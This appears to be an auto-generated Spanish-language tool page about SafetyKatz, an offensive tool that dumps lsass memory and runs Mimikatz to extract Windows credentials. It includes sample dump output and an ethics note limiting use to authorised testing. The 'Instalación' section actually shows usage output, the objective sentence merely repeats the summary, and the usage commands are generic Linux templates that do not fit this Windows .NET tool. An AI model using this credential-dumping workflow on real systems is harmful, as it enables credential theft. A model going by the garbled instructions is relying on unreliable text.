---
title: "SafetyKatz: SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimika"
slug: "safetykatz"
summary: "SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader."
category: "ciberseguridad"
level: "Avanzado"
reading: 6
tags: ['credential-dumping', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es SafetyKatz

SafetyKatz es una herramienta de seguridad ofensiva / red team. SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader.

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- **Sección del toolkit:** Credential Dumping 

## Objetivo y función

El objetivo principal de SafetyKatz es safetykatz is a combination of slightly modified version of @gentilkiwi's mimikatz project and @subtee's .net pe loader.

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

C:\Temp>SafetyKatz.exe

    [*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
    [+] Dump successful!

    [*] Executing loaded Mimikatz PE

    .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   *** /

    mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...

    Authentication Id : 0 ; 28935082 (00000000:01b983aa)
    Session           : Interactive from 0
    User Name         : blahuser
    Domain            : WINDOWS10
    Logon Server      : WINDOWS10
    Logon Time        : 7/15/2018 1:07:55 PM
    SID               : S-1-5-21-1473254003-2681465353-4059813368-1002
            msv :
            [00000003]
    Primary
            * Username : blahuser
            * Domain   : WINDOWS10

    ...(snip)...

    mimikatz # deleting C:\Windows\Temp\debug.bin

## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/GhostPack/SafetyKatz
cd safetykatz

# Revisar ayuda
./safetykatz --help 2>/dev/null || python3 -m safetykatz --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Esta herramienta está pensada para Windows, .NET o entornos de Active Directory. No se instala de forma nativa en Termux; úsala desde una máquina virtual, un contenedor o un laboratorio con Windows/Linux completo.

## Buenas prácticas y ética

Usa SafetyKatz únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/GhostPack/SafetyKatz
- Toolkit de origen: Red Teaming Toolkit
